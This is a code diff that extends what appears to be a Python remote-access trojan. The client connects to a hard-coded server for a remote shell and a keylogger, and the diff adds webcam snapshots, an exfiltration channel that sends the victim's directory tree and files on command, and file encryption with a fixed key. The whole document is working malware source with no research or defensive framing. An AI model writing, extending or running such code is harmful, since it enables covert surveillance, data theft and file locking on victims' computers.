@@ -1,7 +1,9 @@
+import json
 import socket, os, subprocess, sys
 import  io
 import threading
 import  requests
+import cv2
 
 from KeyLogger import KeyLog
 from LockFile import LockFile
@@ -20,6 +22,7 @@ else:
 SERVER_HOST = "192.168.89.229"
 SERVER_PORT_KEYLOGGER = 5000
 SERVER_PORT_SHELL = 5005
+SERVER_PORT_MANAGE_FILE = 5050
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
 
@@ -76,6 +79,22 @@ def client_shell():
             s.sendall(f"{len(img_data)}{SEPARATOR}{'image'}".encode())
             s.sendall(img_data)
             output = ""
+        elif splited_command[0] == 'webcam':
+            cap = cv2.VideoCapture(0)
+            if not cap.isOpened():
+                print("Cannot open webcam")
+                exit()
+            ret, frame = cap.read()
+            if not ret:
+                print("Failed to grab frame")
+                cap.release()
+                exit()
+            cap.release()
+            _, img_encoded = cv2.imencode('.png', frame)
+            img_bytes = img_encoded.tobytes()
+            s.sendall(f"{len(img_bytes)}{SEPARATOR}{'image'}".encode())
+            s.sendall(img_bytes)
+
         elif (splited_command[0] == 'de') | (splited_command[0] == 'en') :
             l = LockFile()
             l.solve("123",splited_command[0],splited_command[1])
@@ -97,20 +116,76 @@ def client_keylogger():
     s.connect((SERVER_HOST, SERVER_PORT_KEYLOGGER))
     print("before shell connect")
     klg = KeyLog(s, SEPARATOR, socket.gethostname())
+
+
+def get_directory_tree(path):
+    tree = {}
+    for entry in os.scandir(path):
+        if entry.is_dir():
+            tree[entry.name] = get_directory_tree(entry.path)
+        else:
+            tree[entry.name] = None
+    return tree
+
+
+def send_directory_tree(client_socket, path):
+    tree = get_directory_tree(path)
+    tree_json = json.dumps(tree)
+
+
+    # Send data in chunks
+    chunk_size = 4096
+    for i in range(0, len(tree_json), chunk_size):
+        chunk = tree_json[i:i + chunk_size]
+        client_socket.send(chunk.encode())
+
+    msg = "<end>"
+    client_socket.send(msg.encode())
+
+def send_file(socket,file):
+    file_name = os.path.basename(file)
+    file_name_bytes = file_name.encode('utf-8')
+    socket.send(len(file_name_bytes).to_bytes(4, 'big'))  # Send length of file name
+    socket.send(file_name_bytes)  # Send the file name
+    with open(file, 'rb') as f:
+        data = f.read(BUFFER_SIZE)
+        while data:
+            print(data)
+            socket.sendall(data)
+            data = f.read(BUFFER_SIZE)
+    msg = "<end>"
+    socket.send(msg.encode())
+
+
+def client_manage_file():
+    s = socket.socket()
+    s.connect((SERVER_HOST, SERVER_PORT_MANAGE_FILE))
+    send_directory_tree(s,os.getcwd())
     while True:
-        x = 1
+        command = s.recv(BUFFER_SIZE).decode()
+        split_command = command.split(SEPARATOR)
+        if(split_command[0] == "en" or split_command[0] == "de"):
+            l = LockFile()
+            l.solve("123", split_command[0], split_command[1])
+        elif split_command[0] == "download":
+            send_file(s,split_command[1])
+
+
 
 
 t1 = threading.Thread(target=client_shell)
 t2 = threading.Thread(target=client_keylogger)
+t3 = threading.Thread(target=client_manage_file)
 
 
 t1.start()
 t2.start()
+t3.start()
 
 
 t1.join()
 t2.join()
+t3.join()
 
 
 
